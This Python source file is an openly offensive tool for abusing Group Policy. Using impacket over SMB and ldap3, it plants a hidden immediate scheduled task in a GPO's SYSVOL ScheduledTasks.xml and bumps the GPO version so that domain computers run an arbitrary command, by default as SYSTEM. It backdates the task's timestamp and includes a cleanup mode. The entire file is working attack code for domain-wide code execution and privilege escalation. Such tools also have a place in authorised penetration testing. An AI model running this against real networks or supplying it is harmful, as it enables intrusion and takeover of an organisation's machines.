#!/usr/bin/env python3
"""
gpo_scheduled_task.py - GPO Scheduled Task Abuse Tool

Creates immediate scheduled tasks in Group Policy Objects via SMB.
Supports specifying an arbitrary user context to run the task as.
"""

import argparse
import binascii
import logging
import os
import re
import sys
import uuid
from datetime import datetime, timedelta
from xml.sax.saxutils import escape

from impacket.examples.utils import parse_credentials
from impacket.smbconnection import SMBConnection


# Client-Side Extension GUIDs for scheduled tasks
# Both entries are required for GPP Scheduled Tasks to work
SCHED_TASK_CSE = "{00000000-0000-0000-0000-000000000000}"
SCHED_TASK_TOOL = "{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}"
GPP_CSE = "{AADCED64-746C-4633-A97C-D61349046527}"  # Group Policy Preferences CSE


def smb_read_file(smb: SMBConnection, path: str) -> str:
    try:
        fh = smb.openFile("SYSVOL", path)
        content = smb.readFile("SYSVOL", fh)
        smb.closeFile("SYSVOL", fh)
        return content.decode("utf-8") if content else ""
    except Exception:
        return ""


def smb_write_file(smb: SMBConnection, path: str, content: str):
    parts = path.split("\\")
    for i in range(1, len(parts)):
        try:
            smb.createDirectory("SYSVOL", "\\".join(parts[:i]))
        except Exception:
            pass
    try:
        smb.deleteFile("SYSVOL", path)
    except Exception:
        pass

    from io import BytesIO

    smb.putFile("SYSVOL", path, BytesIO(content.encode("utf-8")).read)


def smb_delete_file(smb: SMBConnection, path: str):
    try:
        smb.deleteFile("SYSVOL", path)
    except Exception:
        pass


def update_gpo_version(
    smb: SMBConnection,
    ldap_server: str,
    domain: str,
    username: str,
    password: str,
    gpo_id: str,
    increment: int = 1,
):
    """Update GPO version in both AD and SYSVOL (GPT.INI).

    Follows pyGPOAbuse approach exactly:
    1. Read current versionNumber from AD (single source of truth)
    2. Calculate new version - scheduled tasks are machine config, so add 1 (low 16 bits)
    3. Write the SAME new version to BOTH AD and GPT.INI
    4. Update extension GUIDs in AD attributes (not GPT.INI)

    Version format:
    - High 16 bits = User Configuration version
    - Low 16 bits = Computer Configuration version
    """
    from ldap3 import Connection, MODIFY_REPLACE, NTLM, Server

    # Build paths and DNs
    domain_dn = ",".join([f"DC={part}" for part in domain.split(".")])
    gpo_dn = f"CN={{{gpo_id}}},CN=Policies,CN=System,{domain_dn}"
    gpo_path = f"{domain}\\Policies\\{{{gpo_id}}}"
    gpt_path = f"{gpo_path}\\GPT.INI"

    # Scheduled tasks are machine config
    ext_attr = "gPCMachineExtensionNames"

    # Connect to LDAP
    server = Server(ldap_server)
    conn = Connection(
        server,
        user=f"{domain}\\{username}",
        password=password,
        authentication=NTLM,
        auto_bind=True,
    )

    # Get current version and extension names from AD
    conn.search(
        gpo_dn,
        "(objectClass=groupPolicyContainer)",
        attributes=["versionNumber", ext_attr],
    )

    if not conn.entries:
        logging.error(f"GPO not found: {gpo_dn}")
        conn.unbind()
        return None

    current_version = int(conn.entries[0].versionNumber.value or 0)

    # Get current extension names
    current_ext = ""
    if hasattr(conn.entries[0], ext_attr) and conn.entries[0][ext_attr].value:
        current_ext = str(conn.entries[0][ext_attr].value)

    # Scheduled tasks are machine configuration - increment low 16 bits
    new_version = current_version + increment
    new_version = max(0, new_version)

    # Build extension GUID strings for scheduled tasks - pyGPOAbuse adds TWO entries
    # Both are required for GPP Scheduled Tasks to work
    ext_guid1 = f"[{SCHED_TASK_CSE}{SCHED_TASK_TOOL}]"
    ext_guid2 = f"[{GPP_CSE}{SCHED_TASK_TOOL}]"

    # Update extension names if needed - add both GUIDs
    new_ext = current_ext
    if ext_guid1 not in new_ext:
        new_ext = new_ext + ext_guid1 if new_ext else ext_guid1
    if ext_guid2 not in new_ext:
        new_ext = new_ext + ext_guid2

    # Update AD: versionNumber and extension names
    modifications = {"versionNumber": [(MODIFY_REPLACE, [new_version])]}
    if new_ext != current_ext:
        modifications[ext_attr] = [(MODIFY_REPLACE, [new_ext])]

    conn.modify(gpo_dn, modifications)

    if conn.result["result"] == 0:
        logging.info(f"AD versionNumber: {current_version} -> {new_version}")
        print(f"[+] AD version updated: {current_version} -> {new_version}")
        if new_ext != current_ext:
            print(f"[+] AD {ext_attr} updated")
    else:
        logging.error(f"Failed to update AD: {conn.result}")
        print(f"[-] Failed to update AD: {conn.result}")
        conn.unbind()
        return None

    conn.unbind()

    # Update GPT.INI with the SAME version number
    # GPT.INI only contains [General] section with Version - no extension GUIDs
    content = smb_read_file(smb, gpt_path)

    if not content:
        content = f"[General]\r\nVersion={new_version}\r\n"
    else:
        # Update existing version
        if re.search(r"Version=\d+", content, re.IGNORECASE):
            content = re.sub(
                r"Version=\d+", f"Version={new_version}", content, flags=re.IGNORECASE
            )
        else:
            # Add version if not present
            if "[General]" in content:
                content = content.replace(
                    "[General]", f"[General]\r\nVersion={new_version}", 1
                )
            else:
                content = f"[General]\r\nVersion={new_version}\r\n" + content

    smb_write_file(smb, gpt_path, content)
    logging.info(f"GPT.INI version -> {new_version}")
    print(f"[+] GPT.INI version updated -> {new_version}")

    return new_version


def generate_task_xml(name: str, command: str, run_as: str, description: str) -> str:
    """Generate ImmediateTaskV2 XML."""
    guid = str(uuid.uuid4()).upper()
    mod_date = (datetime.now() - timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")

    is_system = run_as.upper() in ("NT AUTHORITY\\SYSTEM", "SYSTEM")
    logon_type = "S4U" if is_system else "InteractiveToken"
    user_context = "0" if is_system else "1"

    shell = escape("c:\\windows\\system32\\cmd.exe")
    cmd_args = escape(f'/c "{command}"')

    return f"""<ImmediateTaskV2 clsid="{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}" name="{name}" image="0" changed="{mod_date}" uid="{{{guid}}}" userContext="{user_context}" removePolicy="0">
  <Properties action="C" name="{name}" runAs="{run_as}" logonType="{logon_type}">
    <Task version="1.3">
      <RegistrationInfo><Author>NT AUTHORITY\\System</Author><Description>{escape(description)}</Description></RegistrationInfo>
      <Principals><Principal id="Author"><UserId>{run_as}</UserId><RunLevel>HighestAvailable</RunLevel><LogonType>{logon_type}</LogonType></Principal></Principals>
      <Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter><RestartOnFailure><Interval>PT15M</Interval><Count>3</Count></RestartOnFailure></Settings>
      <Actions Context="Author"><Exec><Command>{shell}</Command><Arguments>{cmd_args}</Arguments></Exec></Actions>
      <Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers>
    </Task>
  </Properties>
</ImmediateTaskV2>"""


def add_task(
    smb: SMBConnection,
    ldap_server: str,
    domain: str,
    username: str,
    password: str,
    gpo_id: str,
    name: str,
    command: str,
    run_as: str,
    description: str,
) -> str:
    name = name or f"TASK_{binascii.b2a_hex(os.urandom(4)).decode()}"
    gpo_path = f"{domain}\\Policies\\{{{gpo_id}}}"
    xml_path = f"{gpo_path}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"

    existing = smb_read_file(smb, xml_path)
    task_xml = generate_task_xml(name, command, run_as, description)

    if existing:
        content = re.sub(
            r"</ScheduledTasks>", task_xml + "\n</ScheduledTasks>", existing
        )
    else:
        content = f'<?xml version="1.0" encoding="utf-8"?>\n<ScheduledTasks clsid="{{CC63F200-7309-4ba0-B154-A71CD118DBCC}}">\n{task_xml}\n</ScheduledTasks>'

    smb_write_file(smb, xml_path, content)
    print(f"[+] Created ScheduledTasks.xml: {xml_path}")

    # Update both AD and SYSVOL versions together
    update_gpo_version(smb, ldap_server, domain, username, password, gpo_id)

    print(f"[+] Created scheduled task: {name}")
    return name


def remove_task(
    smb: SMBConnection,
    ldap_server: str,
    domain: str,
    username: str,
    password: str,
    gpo_id: str,
    name: str,
):
    gpo_path = f"{domain}\\Policies\\{{{gpo_id}}}"
    xml_path = f"{gpo_path}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"

    content = smb_read_file(smb, xml_path)
    if not content:
        print("[*] No ScheduledTasks.xml found")
        return

    new_content = re.sub(
        rf'<ImmediateTaskV2[^>]*name="{re.escape(name)}".*?</ImmediateTaskV2>\s*',
        "",
        content,
        flags=re.DOTALL,
    )

    if "<ImmediateTaskV2" not in new_content:
        smb_delete_file(smb, xml_path)
        print("[+] Deleted ScheduledTasks.xml (no tasks remaining)")
    else:
        smb_write_file(smb, xml_path, new_content)
        print("[+] Removed task from ScheduledTasks.xml")

    # Decrement GPO version in both AD and SYSVOL
    update_gpo_version(
        smb, ldap_server, domain, username, password, gpo_id, increment=-1
    )

    print(f"[+] Removed scheduled task: {name}")


def main():
    parser = argparse.ArgumentParser(description="GPO Scheduled Task Abuse")
    parser.add_argument("target", help="domain/username:password")
    parser.add_argument("-dc-ip", required=True, help="Domain controller IP")
    parser.add_argument("-gpo-id", required=True, help="GPO GUID (without braces)")
    parser.add_argument("-command", default="whoami", help="Command to execute")
    parser.add_argument("-taskname", default="", help="Task name (default: random)")
    parser.add_argument("-run-as", default="NT AUTHORITY\\System", help="User context")
    parser.add_argument("-description", default="Scheduled task", help="Description")
    parser.add_argument("--cleanup", action="store_true", help="Remove the task")
    parser.add_argument("-v", action="count", default=0, help="Verbosity")

    args = parser.parse_args()
    logging.basicConfig(
        level=[logging.WARNING, logging.INFO, logging.DEBUG][min(args.v, 2)]
    )

    domain, username, password = parse_credentials(args.target)
    if not domain:
        print("Error: Domain required")
        sys.exit(1)

    try:
        smb = SMBConnection(args.dc_ip, args.dc_ip)
        smb.login(username, password, domain)
    except Exception as e:
        print(f"SMB connection failed: {e}")
        sys.exit(1)

    if args.cleanup:
        if not args.taskname:
            print("Error: -taskname required for cleanup")
            sys.exit(1)
        remove_task(
            smb, args.dc_ip, domain, username, password, args.gpo_id, args.taskname
        )
    else:
        add_task(
            smb,
            args.dc_ip,
            domain,
            username,
            password,
            args.gpo_id,
            args.taskname,
            args.command,
            args.run_as,
            args.description,
        )

    smb.close()


if __name__ == "__main__":
    main()
